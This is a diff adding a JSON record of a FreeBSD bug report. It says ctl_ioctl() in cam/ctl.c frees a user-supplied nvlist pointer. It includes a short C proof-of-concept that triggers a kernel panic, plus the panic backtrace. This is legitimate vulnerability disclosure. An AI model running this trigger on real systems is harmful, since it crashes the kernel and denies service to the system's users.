@@ -1,0 +1,8 @@
+{
+ "id": 1224753,
+ "bug_id": 266115,
+ "attachment_id": 0,
+ "creation_time": "2022-08-30T15:52:41Z",
+ "creator": "rtm@lcs.mit.edu",
+ "text": "In cam/ctl.c, ctl_ioctl(), for CTL_PORT_REQ, if user code passes in a\nnon-null req-\u003eresult_nvl, but a null req-\u003eresult, and fe-\u003eioctl is\nzero, then ctl_ioctl() calls nvlist_destroy() with the user-supplied\nreq-\u003eresult_nvl.\n\nHere's a demo:\n\nint main() {\n  int fd = open(\"/dev/cam/ctl\", 2);\n  char buf[256];\n  memset(buf, 0, sizeof(buf));\n  strcpy(buf, \"camtgt\"); // driver\n  *(unsigned long long *)(buf+72) = 0x8000000000000000; // result_nvl\n  ioctl(fd, 0xc100e126, buf); // CTL_PORT_REQ\n}\n\n# uname -a\nFreeBSD  14.0-CURRENT FreeBSD 14.0-CURRENT #40 main-n250928-b8170f38ccc7-dirty: Mon Aug 29 13:09:55 EDT 2022     rtm@xxx:/usr/obj/usr/rtm/symbsd/src/riscv.riscv64/sys/RTM riscv\n# cc x.c\n# ./a.out\npanic: Fatal page fault at 0xffffffc0000a9b16: 0x8000000000000000\npanic() at panic+0x2a\npage_fault_handler() at page_fault_handler+0x1d6\ndo_trap_supervisor() at do_trap_supervisor+0x76\ncpu_exception_handler_supervisor() at cpu_exception_handler_supervisor+0x70\n--- exception 13, tval = 0x8000000000000000\nnvlist_destroy() at nvlist_destroy+0x10\nctl_ioctl() at ctl_ioctl+0x183a\ndevfs_ioctl() at devfs_ioctl+0xbe\nVOP_IOCTL_APV() at VOP_IOCTL_APV+0x30\nVOP_IOCTL() at VOP_IOCTL+0x36\nvn_ioctl() at vn_ioctl+0xba\ndevfs_ioctl_f() at devfs_ioctl_f+0x20\nfo_ioctl() at fo_ioctl+0xa\nkern_ioctl() at kern_ioctl+0x242\nsys_ioctl() at sys_ioctl+0x120\nsyscallenter() at syscallenter+0xec\necall_handler() at ecall_handler+0x18\ndo_trap_user() at do_trap_user+0xea\ncpu_exception_handler_user() at cpu_exception_handler_user+0x72"
+}
